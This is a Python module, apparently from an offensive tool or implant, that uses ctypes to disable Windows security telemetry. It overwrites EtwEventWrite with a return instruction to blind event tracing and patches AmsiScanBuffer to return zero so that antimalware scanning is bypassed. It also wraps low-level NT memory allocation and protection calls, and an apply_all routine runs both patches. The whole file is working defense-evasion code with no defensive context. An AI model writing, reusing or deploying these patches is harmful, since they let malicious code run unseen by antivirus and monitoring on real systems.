import ctypes
import ctypes.wintypes
from ctypes import addressof, create_string_buffer, memmove, memset, sizeof, byref, cast, c_void_p, c_byte, c_ulong, c_size_t
from log_utils import log

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

_PAGE_READWRITE = 0x04
_PAGE_EXECUTE_READWRITE = 0x40
_PROCESS_ALL_ACCESS = 0x1F0FFF
_MEM_COMMIT = 0x1000
_MEM_RESERVE = 0x2000

_RET_INSTR = b"\xC3"
_XOR_EAX_EAX_RET = b"\x33\xC0\xC3"

def _patch_function(module_handle, function_name, patch_bytes):
    try:
        addr = kernel32.GetProcAddress(module_handle, function_name.encode())
        if not addr:
            return False
        old_protect = ctypes.c_ulong(0)
        size = len(patch_bytes)
        if not kernel32.VirtualProtect(addr, size, _PAGE_EXECUTE_READWRITE, byref(old_protect)):
            return False
        memmove(addr, patch_bytes, size)
        kernel32.VirtualProtect(addr, size, old_protect, byref(ctypes.c_ulong(0)))
        return True
    except Exception as e:
        log("debug", f"Failed to patch {function_name}: {e}")
        return False


def patch_etw():
    ntdll_handle = kernel32.GetModuleHandleW("ntdll.dll")
    if not ntdll_handle:
        log("debug", "Failed to get ntdll handle for ETW patch")
        return False
    patched = _patch_function(ntdll_handle, "EtwEventWrite", _RET_INSTR)
    if patched:
        log("info", "ETW patched (EtwEventWrite → RET)")
    return patched


def patch_amsi():
    amsi_handle = kernel32.GetModuleHandleW("amsi.dll")
    if not amsi_handle:
        log("debug", "amsi.dll not loaded, attempting to load")
        amsi_handle = kernel32.LoadLibraryW("amsi.dll")
        if not amsi_handle:
            log("debug", "Failed to load amsi.dll for patching")
            return False
    patched = _patch_function(amsi_handle, "AmsiScanBuffer", _XOR_EAX_EAX_RET)
    if patched:
        log("info", "AMSI patched (AmsiScanBuffer → XOR EAX,EAX; RET)")
    return patched


def _resolve_ntdll_function(name):
    handle = kernel32.GetModuleHandleW("ntdll.dll")
    if not handle:
        return None
    return kernel32.GetProcAddress(handle, name.encode())


def direct_ntqueryinfo(process_handle, info_class, buf, buf_size, ret_len):
    NtQueryInformationProcess = ctypes.WINFUNCTYPE(
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.c_uint32,
        ctypes.c_void_p
    )(_resolve_ntdll_function("NtQueryInformationProcess"))
    if not NtQueryInformationProcess:
        raise RuntimeError("Failed to resolve NtQueryInformationProcess")
    return NtQueryInformationProcess(
        ctypes.c_void_p(process_handle),
        ctypes.c_uint32(info_class),
        buf,
        ctypes.c_uint32(buf_size),
        ret_len
    )


def direct_ntallocatevirtualmemory(process_handle, base_addr, zero_bits, region_size, allocation_type, protect):
    NtAllocateVirtualMemory = ctypes.WINFUNCTYPE(
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_void_p),
        ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_size_t),
        ctypes.c_ulong,
        ctypes.c_ulong
    )(_resolve_ntdll_function("NtAllocateVirtualMemory"))
    if not NtAllocateVirtualMemory:
        raise RuntimeError("Failed to resolve NtAllocateVirtualMemory")
    return NtAllocateVirtualMemory(
        ctypes.c_void_p(process_handle),
        base_addr,
        ctypes.c_ulong(zero_bits),
        region_size,
        ctypes.c_ulong(allocation_type),
        ctypes.c_ulong(protect)
    )


def direct_ntprotectvirtualmemory(process_handle, base_addr, region_size, new_protect, old_protect):
    NtProtectVirtualMemory = ctypes.WINFUNCTYPE(
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_void_p),
        ctypes.POINTER(ctypes.c_size_t),
        ctypes.c_ulong,
        ctypes.POINTER(ctypes.c_ulong)
    )(_resolve_ntdll_function("NtProtectVirtualMemory"))
    if not NtProtectVirtualMemory:
        raise RuntimeError("Failed to resolve NtProtectVirtualMemory")
    return NtProtectVirtualMemory(
        ctypes.c_void_p(process_handle),
        base_addr,
        region_size,
        ctypes.c_ulong(new_protect),
        old_protect
    )


def apply_all():
    results = []
    try:
        results.append(("etw", patch_etw()))
    except Exception as e:
        log("debug", f"ETW patch exception: {e}")
        results.append(("etw", False))
    try:
        results.append(("amsi", patch_amsi()))
    except Exception as e:
        log("debug", f"AMSI patch exception: {e}")
        results.append(("amsi", False))
    return results
